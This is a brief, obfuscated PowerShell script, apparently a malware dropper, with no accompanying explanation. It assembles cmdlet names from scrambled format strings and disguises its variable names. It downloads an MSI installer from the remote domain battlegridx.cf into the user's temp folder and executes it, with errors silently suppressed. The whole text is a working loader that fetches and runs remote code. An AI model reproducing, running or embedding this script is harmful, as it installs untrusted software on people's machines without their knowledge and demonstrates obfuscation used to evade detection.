

  ${S`oMeDA`Ta} = @(
  [PSCustomObject]@{('a') = ("{1}{6}{3}{0}{2}{5}{4}" -f'GY','https://battlegridx.cf','GV','/','T.msi','DIX','d'); ('b') = ("{0}{1}{2}"-f'GYGVD','IXT','.msi')}
);
  foreach (${I} in ${soME`D`ATa}) {
    try {
      ${F`ILEpA`TH} = "$env:TEMP\$($i.b)";
      ${DOw`NlO`AD} = ${t`Rue};
      if (.("{2}{0}{1}" -f'-P','ath','Test') ${file`Pa`TH}) {
        ${D`O`wnl`oad} = ${F`Alse};
      } 
      if (${dOWN`LO`AD}) {
        &("{1}{0}{3}{2}"-f 'Met','Invoke-Rest','d','ho') -Uri ${I}."a" -OutFile ${FIlE`Pa`TH}; 
      }
      .("{3}{1}{0}{2}" -f 'oce','-Pr','ss','Start') ${fIL`E`pAtH};
    }
    catch {
    }
  }

  
